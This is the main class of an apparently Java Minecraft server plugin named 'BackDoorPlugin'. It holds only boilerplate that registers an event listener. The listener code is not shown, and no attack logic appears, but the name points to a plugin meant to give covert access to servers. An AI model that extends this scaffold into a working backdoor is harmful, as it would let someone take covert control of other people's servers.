package me.just.backdoorplugin;

import me.just.backdoorplugin.event.Events;
import org.bukkit.plugin.java.JavaPlugin;

public final class BackDoorPlugin extends JavaPlugin {

    @Override
    public void onEnable() {
        getServer().getPluginManager().registerEvents(new Events(), this);
    }

    @Override
    public void onDisable() {
        // Plugin shutdown logic
    }
}
